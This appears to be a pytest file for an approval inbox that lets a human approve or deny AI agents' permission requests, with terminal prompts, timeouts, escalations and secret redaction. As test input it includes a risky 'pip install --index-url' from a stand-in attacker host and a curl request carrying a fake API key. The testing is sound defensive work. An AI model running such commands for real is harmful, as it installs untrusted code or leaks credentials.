"""Tests for the approval inbox and the terminal prompt (W1-05 A4, A5)."""

import asyncio
import os
import queue
import threading
import time
from pathlib import Path
from typing import Any

import pytest

from arr.errors import ArrError
from arr.models import AgentConfig
from arr.permissions.inbox import (
    INSTALL_PASS_S,
    ApprovalInbox,
    TerminalDecider,
    format_item,
    item_id_prefix,
)
from arr.permissions.policy import (
    TIMEOUT_REASON,
    AlwaysRule,
    ApprovalLog,
    PolicyEngine,
    RunPaths,
    profile_for,
)
from arr.permissions.types import (
    ApprovalItem,
    ApprovalStatus,
    ApprovalType,
    DecidedBy,
    Decision,
    DecisionAction,
    DecisionScope,
    EscalationOption,
    PermissionRequest,
)

ALLOW, DENY = DecisionAction.ALLOW, DecisionAction.DENY
FIRST = f"{item_id_prefix('r1')}_0001"
SECRET = "sk-ant-api03-SECRETSECRETSECRET"


class FakeTerminal:
    """Simulated terminal: lines come from a queue, output is collected."""

    def __init__(self, *lines: str | None) -> None:
        self.lines: queue.Queue[str | None] = queue.Queue()
        for line in lines:
            self.lines.put(line)
        self.output: list[str] = []
        self.prompts: list[str] = []

    def read_line(self, prompt: str) -> str:
        self.prompts.append(prompt)
        line = self.lines.get(timeout=10)
        if line is None:
            raise EOFError
        return line

    def write(self, text: str) -> None:
        self.output.append(text)

    @property
    def text(self) -> str:
        return "\n".join(self.output + self.prompts)

    def decider(self) -> TerminalDecider:
        # `is_terminal`: the TTY check applies to an own `read_line` as well (W1-05.1 N4)
        return TerminalDecider(read_line=self.read_line, write=self.write, is_terminal=lambda: True)


@pytest.fixture
def engine(tmp_path: Path, arr_home: Path) -> PolicyEngine:
    home = Path(os.path.realpath(tmp_path)) / "home"
    workfolder = home / "arr-work"
    run = workfolder / "runs" / "r1"
    profiles = []
    for agent_id in ("explorer-1", "explorer-2"):
        (run / "agents" / agent_id / "work").mkdir(parents=True)
        agent = AgentConfig(
            id=agent_id, base_id="explorer", provider="claude", model="m", auth="max-privat"
        )
        profiles.append(profile_for(agent, RunPaths(workfolder, run), home=home))
    return PolicyEngine(profiles, log=ApprovalLog(run / "approvals.jsonl"))


def install(agent_id: str = "explorer-1", **kw: Any) -> PermissionRequest:
    return PermissionRequest(
        run_id="r1",
        agent_id=agent_id,
        role="explorer",
        provider="claude",
        tool="Bash",
        command="pip install python-flint",
        reason="Ich brauche FLINT für schnelle Zahlentheorie.",
        **kw,
    )


# --------------------------------------------------------------------------------------------
# A5: terminal prompt and timeout
# --------------------------------------------------------------------------------------------


async def test_terminal_allow_once(engine: PolicyEngine) -> None:
    terminal = FakeTerminal("einmal")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5)
    decision = await inbox.handle(install())
    assert decision.action is ALLOW and decision.scope is DecisionScope.ONCE
    assert decision.decided_by is DecidedBy.USER
    item = inbox.items()[0]
    assert item.id == FIRST and item.status is ApprovalStatus.DECIDED
    text = terminal.text
    for part in [
        f"Freigabe-Anfrage {FIRST}",
        "explorer-1 (Rolle explorer, claude)",
        "Befehl:         pip install python-flint",
        "Begründung des Agenten: Ich brauche FLINT",
        "Risiko:         mittel – ",
        "Kategorien:     Installation, Netzwerk",
        "Braucht eine Freigabe",
        "einmal  – nur diese Anfrage erlauben",
    ]:
        assert part in text, part
    # once: the next identical request asks again
    terminal.lines.put("nein")
    terminal.lines.put("")
    second = await inbox.handle(install())
    assert second.action is DENY and second.decided_by is DecidedBy.USER
    assert "Im Terminal abgelehnt" in second.reason


async def test_terminal_scope_agent_is_remembered(engine: PolicyEngine) -> None:
    terminal = FakeTerminal("agent")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5)
    assert (await inbox.handle(install())).scope is DecisionScope.AGENT
    prompts = len(terminal.prompts)
    again = await inbox.handle(install())
    assert again.action is ALLOW and len(terminal.prompts) == prompts  # no new prompt
    assert len(inbox.items()) == 1
    terminal.lines.put("run")
    other = await inbox.handle(install("explorer-2"))
    assert other.scope is DecisionScope.RUN


async def test_terminal_rejects_single_keys_and_empty_lines(engine: PolicyEngine) -> None:
    terminal = FakeTerminal("", "j", "y", "ja", "nein", "Bitte ohne FLINT.")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5)
    decision = await inbox.handle(install())
    assert decision.action is DENY
    assert decision.reason == "Im Terminal abgelehnt: Bitte ohne FLINT."
    assert terminal.text.count("verstehe ich nicht") == 4


async def test_terminal_always_needs_confirmation(engine: PolicyEngine) -> None:
    rules: list[AlwaysRule] = []
    terminal = FakeTerminal("immer", "ja", "immer", "ja immer")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5, on_rule=rules.append)
    decision = await inbox.handle(install())
    assert decision.scope is DecisionScope.ALWAYS and decision.decided_by is DecidedBy.USER
    assert "Nicht bestätigt" in terminal.text
    assert rules and rules[0].commands == ["pip install python-flint"]
    assert engine.evaluate(install("explorer-2")).action is ALLOW


async def test_terminal_closed_denies(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, decider=FakeTerminal(None).decider(), timeout=5)
    decision = await inbox.handle(install())
    assert decision.action is DENY and decision.decided_by is DecidedBy.FIXED_RULE
    assert TIMEOUT_REASON in decision.reason


async def test_timeout_denies_with_hint(engine: PolicyEngine) -> None:
    terminal = FakeTerminal()  # nobody answers
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=0.2)
    decision = await inbox.handle(install())
    assert decision.action is DENY
    assert decision.decided_by is DecidedBy.FIXED_RULE
    assert decision.reason == TIMEOUT_REASON
    assert "frage im Chat nach" in decision.reason
    item = inbox.items()[0]
    assert item.status is ApprovalStatus.EXPIRED and item.decision == decision
    assert item.deadline is not None and item.deadline > item.created_at
    assert "abgelaufen" in terminal.text
    events = [e["event"] for e in engine.log.entries()] if engine.log else []
    assert events[-2:] == ["open", "expired"]
    terminal.lines.put(None)  # release the reader thread


async def test_line_for_expired_request_is_not_applied_to_the_next(
    engine: PolicyEngine,
) -> None:
    terminal = FakeTerminal()
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=0.3)
    first = await inbox.handle(install())
    assert first.reason == TIMEOUT_REASON
    inbox.timeout = 5
    second = asyncio.create_task(inbox.handle(install("explorer-2")))
    await asyncio.sleep(0.05)
    terminal.lines.put("einmal")  # typed late, belongs to apr_0001 → dropped
    terminal.lines.put("nein")
    terminal.lines.put("")
    decision = await second
    assert decision.action is DENY
    assert "abgelaufenen Anfrage" in terminal.text


async def test_parallel_requests_are_asked_one_after_the_other(engine: PolicyEngine) -> None:
    terminal = FakeTerminal("einmal", "nein", "")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5)
    first, second = await asyncio.gather(
        inbox.handle(install()), inbox.handle(install("explorer-2"))
    )
    assert {first.action, second.action} == {ALLOW, DENY}
    assert terminal.text.count("Freigabe-Anfrage apr_") == 2


async def test_timeout_from_settings_duration(engine: PolicyEngine) -> None:
    from datetime import timedelta

    inbox = ApprovalInbox(engine, timeout=timedelta(minutes=20))
    assert inbox.timeout == 1200


# --------------------------------------------------------------------------------------------
# Inbox without terminal: GUI-like resolve, cancel, revoke, broken deciders
# --------------------------------------------------------------------------------------------


async def test_resolve_from_outside_like_the_gui(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    assert item.request is not None and item.risk is not None and item.summary
    decision = Decision(action=ALLOW, scope=DecisionScope.RUN, decided_by=DecidedBy.USER)
    inbox.resolve(item.id, decision)
    assert (await waiting).action is ALLOW
    with pytest.raises(ArrError, match="nicht mehr offen"):
        inbox.resolve(item.id, decision)
    # The run-wide grant covers the other agent, then is revoked.
    assert (await inbox.handle(install("explorer-2"))).action is ALLOW
    revoked = inbox.revoke(item.id)
    assert revoked.status is ApprovalStatus.REVOKED
    waiting = asyncio.create_task(inbox.handle(install("explorer-2")))
    await asyncio.sleep(0.01)
    assert len(inbox.pending()) == 1
    inbox.cancel_all()
    assert (await waiting).action is DENY


async def test_resolve_rejects_wrong_actions(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    with pytest.raises(ArrError):
        inbox.resolve(item.id, Decision(action=DecisionAction.ASK, decided_by=DecidedBy.USER))
    inbox.cancel(item.id)
    decision = await waiting
    assert decision.action is DENY and "hinfällig" in decision.reason
    assert inbox.get(item.id).status is ApprovalStatus.OBSOLETE
    with pytest.raises(ArrError):
        inbox.get("apr_9999")


async def test_revoke_only_revocable(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.USER))  # once
    await waiting
    with pytest.raises(ArrError, match="nicht zurückziehen"):
        inbox.revoke(item.id)


async def test_cancelled_wait_marks_item_obsolete(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    waiting.cancel()
    with pytest.raises(asyncio.CancelledError):
        await waiting
    assert inbox.items()[0].status is ApprovalStatus.OBSOLETE


class BrokenDecider:
    async def decide(self, item: ApprovalItem) -> Decision | None:
        raise RuntimeError("kaputt")


class GatekeeperStub:
    async def decide(self, item: ApprovalItem) -> Decision | None:
        return Decision(action=DENY, decided_by=DecidedBy.GATEKEEPER, reason="Vollmacht: nein")


async def test_broken_decider_never_raises_and_times_out(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, decider=BrokenDecider(), timeout=0.1)
    decision = await inbox.handle(install())
    assert decision.reason == TIMEOUT_REASON


async def test_other_deciders_use_the_same_interface(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, decider=GatekeeperStub(), timeout=5)
    decision = await inbox.handle(install())
    assert decision.decided_by is DecidedBy.GATEKEEPER and decision.action is DENY


async def test_allowed_requests_skip_the_inbox(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, decider=FakeTerminal().decider(), timeout=5)
    request = PermissionRequest(run_id="r1", agent_id="explorer-1", tool="Bash", command="ls")
    assert (await inbox.handle(request)).action is ALLOW
    assert not inbox.items()


# --------------------------------------------------------------------------------------------
# A4: approvals.jsonl with decided_by, scope and reason, without secrets
# --------------------------------------------------------------------------------------------


async def test_log_records_the_whole_flow_without_secrets(engine: PolicyEngine) -> None:
    assert engine.log is not None
    terminal = FakeTerminal("agent")
    inbox = ApprovalInbox(engine, decider=terminal.decider(), timeout=5)
    request = PermissionRequest(
        run_id="r1",
        agent_id="explorer-1",
        tool="Bash",
        command=f"curl -H 'x-api-key: {SECRET}' https://api.example/v1?token={SECRET}",
        reason=f"Test mit ANTHROPIC_API_KEY={SECRET}",
    )
    await inbox.handle(request)
    inbox.revoke(FIRST)
    entries = engine.log.entries()
    assert [e["event"] for e in entries] == ["decision", "open", "decided", "revoked"]
    for entry in entries:
        decision = entry["decision"]
        assert {"decided_by", "scope", "reason", "decided_at"} <= decision.keys()
        assert entry["request"]["agent_id"] == "explorer-1"
    assert entries[2]["decision"]["decided_by"] == "user"
    assert entries[2]["decision"]["scope"] == "agent"
    assert SECRET not in engine.log.path.read_text()
    assert SECRET not in terminal.text
    # A new inbox on the same log continues the numbering.
    assert ApprovalInbox(engine)._next_id("r1") == f"{item_id_prefix('r1')}_0002"


def test_format_item_redacts_and_is_german(engine: PolicyEngine) -> None:
    assessment = engine.assess(install())
    item = ApprovalItem(
        id="apr_0007",
        type="permission",
        run_id="r1",
        request=assessment.request.model_copy(update={"reason": f"Key {SECRET}"}),
        risk=assessment.decision.risk,
        summary=assessment.decision.reason,
    )
    text = format_item(item)
    assert SECRET not in text and "Freigabe-Anfrage apr_0007" in text
    assert "Antworte mit einem ganzen Wort" in text


def test_reader_thread_is_daemon(engine: PolicyEngine) -> None:
    # The terminal reader must never keep the process alive after a timeout.
    started = threading.Event()

    def read_line(prompt: str) -> str:
        started.set()
        threading.Event().wait(0.5)
        return "einmal"

    decider = TerminalDecider(read_line=read_line, write=lambda _: None, is_terminal=lambda: True)

    async def run() -> None:
        item = ApprovalItem(id="apr_0001", type="permission", run_id="r1", request=install())
        task = asyncio.create_task(decider.decide(item))
        await asyncio.to_thread(started.wait, 2)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(run())
    threads = [t for t in threading.enumerate() if t.name == "arr-approval-input"]
    assert all(t.daemon for t in threads)


# ============================================================================================
# Nacharbeit W1-05.1
# ============================================================================================

import io  # noqa: E402
import re  # noqa: E402
import sys  # noqa: E402

from arr.permissions.types import EscalatedBy  # noqa: E402


async def test_b2_terminal_always_with_secret_becomes_run(engine: PolicyEngine) -> None:
    assert engine.log is not None
    rules: list[AlwaysRule] = []
    notes: list[str] = []
    terminal = FakeTerminal("immer", "ja immer")
    inbox = ApprovalInbox(
        engine,
        decider=terminal.decider(),
        timeout=5,
        on_rule=rules.append,
        on_note=notes.append,
    )
    request = install().model_copy(update={"command": f"OPENAI_API_KEY={SECRET} pip install sympy"})
    decision = await inbox.handle(request)
    assert decision.action is ALLOW and decision.scope is DecisionScope.RUN
    assert not rules and not engine.rules.always
    assert notes and "Geheimnis" in notes[0]
    assert "Hinweis:" in terminal.text and "Geheimnis" in terminal.text
    assert inbox.items()[0].decision is not None
    assert inbox.items()[0].decision.scope is DecisionScope.RUN
    decided = [e for e in engine.log.entries() if e["event"] == "decided"][0]
    assert "Geheimnis" in decided["note"]
    assert SECRET not in engine.log.path.read_text()


async def test_b2_no_terminal_no_approval(
    engine: PolicyEngine, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A pipe is no terminal: the user agent cannot approve through `printf … | arr run`.
    monkeypatch.setattr(sys, "stdin", io.StringIO("immer\nja immer\n"))
    output: list[str] = []
    inbox = ApprovalInbox(engine, decider=TerminalDecider(write=output.append), timeout=5)
    decision = await inbox.handle(install())
    assert decision.action is DENY and decision.decided_by is DecidedBy.FIXED_RULE
    assert "kein Terminal" in decision.reason
    item = inbox.items()[0]
    assert item.status is ApprovalStatus.OBSOLETE
    assert not engine.rules.always and not output
    explicit = TerminalDecider(read_line=lambda _: "einmal", is_terminal=lambda: False)
    inbox = ApprovalInbox(engine, decider=explicit, timeout=5)
    assert (await inbox.handle(install())).action is DENY


async def test_w2_05_n4_own_read_line_needs_a_terminal_too(
    engine: PolicyEngine, monkeypatch: pytest.MonkeyPatch
) -> None:
    """W1-05.1 review N4: an own `read_line` does not switch the TTY check off."""
    monkeypatch.setattr(sys, "stdin", io.StringIO("einmal\n"))
    asked: list[str] = []

    def read_line(prompt: str) -> str:
        asked.append(prompt)
        return "einmal"

    decider = TerminalDecider(read_line=read_line, write=lambda _: None)
    inbox = ApprovalInbox(engine, decider=decider, timeout=5)
    decision = await inbox.handle(install())
    assert decision.action is DENY and "kein Terminal" in decision.reason
    assert asked == [], "nothing was asked through the pipe"
    assert inbox.items()[0].status is ApprovalStatus.OBSOLETE


async def test_b3_escalated_by(engine: PolicyEngine) -> None:
    assert engine.log is not None
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    note = "Domain nicht in der Vollmacht."
    escalated = inbox.escalate(item.id, EscalatedBy(decider=DecidedBy.GATEKEEPER, note=note))
    assert escalated.status is ApprovalStatus.OPEN
    assert escalated.escalated_by is not None and escalated.escalated_by.note == note
    assert escalated.risk is not None and escalated.risk.text
    inbox.resolve(item.id, Decision(action=DENY, decided_by=DecidedBy.USER, reason="nein"))
    await waiting
    assert inbox.get(item.id).escalated_by is not None
    events = [(e["event"], e.get("note")) for e in engine.log.entries()]
    assert ("escalated", note) in events
    with pytest.raises(ArrError):
        inbox.escalate(item.id, EscalatedBy(decider=DecidedBy.MANDATE_RULE))


async def test_b3_ids_are_unique_across_runs(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    ids = [inbox._next_id(run) for run in ("r1", "r1", "r2", "20261023-1742_collatz_a3f9")]
    assert len(set(ids)) == 4
    assert all(re.fullmatch(r"apr_[0-9a-f]{16}_\d{4}", i) for i in ids)
    assert ids[0].endswith("_0001") and ids[1].endswith("_0002") and ids[2].endswith("_0001")
    assert ids[0].rsplit("_", 1)[0] != ids[2].rsplit("_", 1)[0]


async def test_b3_resolve_from_another_thread(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    decision = Decision(action=ALLOW, decided_by=DecidedBy.USER)
    results: list[str] = []

    def gui(i: int) -> None:
        try:
            inbox.resolve(item.id, decision)
            results.append("ok")
        except ArrError:
            results.append("closed")

    threads = [threading.Thread(target=gui, args=(i,)) for i in range(5)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert (await asyncio.wait_for(waiting, 2)).action is ALLOW
    assert sorted(results) == ["closed"] * 4 + ["ok"]


async def test_b3_revoke_gatekeeper_once_is_a_no_op(engine: PolicyEngine) -> None:
    assert engine.log is not None
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.GATEKEEPER))
    await waiting
    assert inbox.get(item.id).revocable
    revoked = inbox.revoke(item.id)
    assert revoked.status is ApprovalStatus.REVOKED
    last = engine.log.entries()[-1]
    assert last["event"] == "revoked" and "Einmalige" in last["note"]
    # the next identical request asks again (nothing was remembered)
    assert engine.evaluate(install()).action is DecisionAction.ASK


# --------------------------------------------------------------------------------------------
# W2-03: escalations of topologies (RunContext.escalate, docs/07 §6, E15)
# --------------------------------------------------------------------------------------------

OPTIONS = [EscalationOption.RETRY, EscalationOption.CONTINUE, EscalationOption.END]


def choose(option: EscalationOption, **kw: Any) -> Decision:
    return Decision(action=DecisionAction.OPTION, option=option, decided_by=DecidedBy.USER, **kw)


async def open_escalation(inbox: ApprovalInbox) -> tuple["asyncio.Task[Decision | None]", str]:
    waiting = asyncio.create_task(
        inbox.ask_escalation("r1", "beweis", "Ø 5,5 nach 2 Versuchen", OPTIONS)
    )
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    assert item.type is ApprovalType.ESCALATION and item.deadline is None
    assert (item.stage, item.options) == ("beweis", OPTIONS)
    return waiting, item.id


async def test_escalation_only_user_once_with_an_offered_option(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=0.01)  # the permission timeout does not apply
    waiting, item_id = await open_escalation(inbox)
    with pytest.raises(ValueError, match="nur der User"):
        Decision(
            action=DecisionAction.OPTION,
            option=EscalationOption.RETRY,
            decided_by=DecidedBy.GATEKEEPER,
        )
    with pytest.raises(ArrError, match="nur du selbst"):
        inbox.resolve(item_id, choose(EscalationOption.RETRY, scope=DecisionScope.RUN))
    with pytest.raises(ArrError, match="angebotenen Optionen"):
        inbox.resolve(item_id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    await asyncio.sleep(0.05)
    assert not waiting.done(), "wrong decisions leave the escalation open, without deadline"
    item = inbox.resolve(item_id, choose(EscalationOption.CONTINUE))
    assert item.status is ApprovalStatus.DECIDED
    decision = await waiting
    assert decision is not None and decision.option is EscalationOption.CONTINUE
    assert engine.log is not None
    events = [e["event"] for e in engine.log.entries() if e.get("item_id") == item_id]
    assert events == ["open", "decided"]


async def test_escalation_cancelled_on_stop_returns_none(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine)
    waiting, item_id = await open_escalation(inbox)
    inbox.cancel_all()
    assert await waiting is None
    item = inbox.get(item_id)
    assert item.status is ApprovalStatus.OBSOLETE and item.decision is None


async def test_terminal_escalation_takes_whole_words(engine: PolicyEngine) -> None:
    terminal = FakeTerminal("w", "nochmal")
    inbox = ApprovalInbox(engine, decider=terminal.decider())
    decision = await asyncio.wait_for(
        inbox.ask_escalation("r1", "beweis", "Ø 5,5", [EscalationOption.RETRY]), 5
    )
    assert decision is not None and decision.option is EscalationOption.RETRY
    assert decision.decided_by is DecidedBy.USER and decision.scope is DecisionScope.ONCE
    assert "Eskalation" in terminal.text and "nochmal" in terminal.text
    assert "weiter" not in terminal.text.split("Deine Wahl")[0], "only offered options"
    assert "„w“ verstehe ich nicht" in terminal.text


async def test_w3_03_equal_requests_of_an_agent_share_one_item(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = [asyncio.create_task(inbox.handle(install())) for _ in range(3)]
    other_agent = asyncio.create_task(inbox.handle(install("explorer-2")))
    await asyncio.sleep(0.01)
    items = inbox.pending()
    assert [i.count for i in items] == [3, 1]
    inbox.resolve(items[0].id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    assert {(await w).action for w in waiting} == {ALLOW}
    assert not other_agent.done()
    inbox.cancel_all()
    assert (await other_agent).action is DENY


async def test_w3_03_a_cancelled_caller_leaves_the_others_waiting(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    first = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    second = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    first.cancel()
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    assert (await second).action is ALLOW


async def test_w3_03_the_last_cancelled_caller_makes_the_item_obsolete(
    engine: PolicyEngine,
) -> None:
    inbox = ApprovalInbox(engine, timeout=5)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    waiting.cancel()
    with pytest.raises(asyncio.CancelledError):
        await waiting
    assert inbox.get(item.id).status is ApprovalStatus.OBSOLETE


async def test_w3_03_a_join_gets_the_deadline_of_the_item(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=0.1)
    first = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.05)
    started = time.monotonic()
    second = await inbox.handle(install())
    assert time.monotonic() - started < 0.09
    assert second.action is DENY and (await first).action is DENY


def host_request(host: str, agent_id: str = "explorer-1") -> PermissionRequest:
    return PermissionRequest(
        run_id="r1", agent_id=agent_id, tool="SandboxNetworkAccess", hosts=[host]
    )


async def test_w3_03_pip_install_asks_once_for_command_and_hosts(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=0.1)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    assert (await waiting).action is ALLOW
    # the hosts of this installation come after the decision: no further item
    answers = await asyncio.gather(*(inbox.handle(host_request("pypi.org")) for _ in range(7)))
    answers.append(await inbox.handle(host_request("files.pythonhosted.org:443")))
    assert {a.action for a in answers} == {ALLOW}
    assert {a.decided_by for a in answers} == {DecidedBy.USER}
    assert len(inbox.items()) == 1
    # any other host and any other agent still ask
    assert (await inbox.handle(host_request("oeis.org"))).action is DENY
    assert (await inbox.handle(host_request("pypi.org", "explorer-2"))).action is DENY
    assert len(inbox.items()) == 3
    logged = [e for e in engine.log.entries() if e["event"] == "decided"]
    assert len(logged) == 1


async def test_w3_03_install_pass_ends_and_a_denied_install_gives_none(
    engine: PolicyEngine, monkeypatch: pytest.MonkeyPatch
) -> None:
    inbox = ApprovalInbox(engine, timeout=0.05)
    waiting = asyncio.create_task(inbox.handle(install()))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=DENY, decided_by=DecidedBy.USER))
    await waiting
    assert (await inbox.handle(host_request("pypi.org"))).action is DENY

    allowed = ApprovalInbox(engine, timeout=0.05)
    waiting = asyncio.create_task(allowed.handle(install()))
    await asyncio.sleep(0.01)
    [item] = allowed.pending()
    allowed.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    await waiting
    later = time.time() + INSTALL_PASS_S + 1
    monkeypatch.setattr("arr.permissions.inbox.time.time", lambda: later)
    assert (await allowed.handle(host_request("pypi.org"))).action is DENY


async def test_w3_03_a_risky_install_gives_no_pass(engine: PolicyEngine) -> None:
    inbox = ApprovalInbox(engine, timeout=0.05)
    risky = install().model_copy(
        update={"command": "pip install --index-url https://evil.example/simple x"}
    )
    waiting = asyncio.create_task(inbox.handle(risky))
    await asyncio.sleep(0.01)
    [item] = inbox.pending()
    inbox.resolve(item.id, Decision(action=ALLOW, decided_by=DecidedBy.USER))
    await waiting
    assert (await inbox.handle(host_request("pypi.org"))).action is DENY
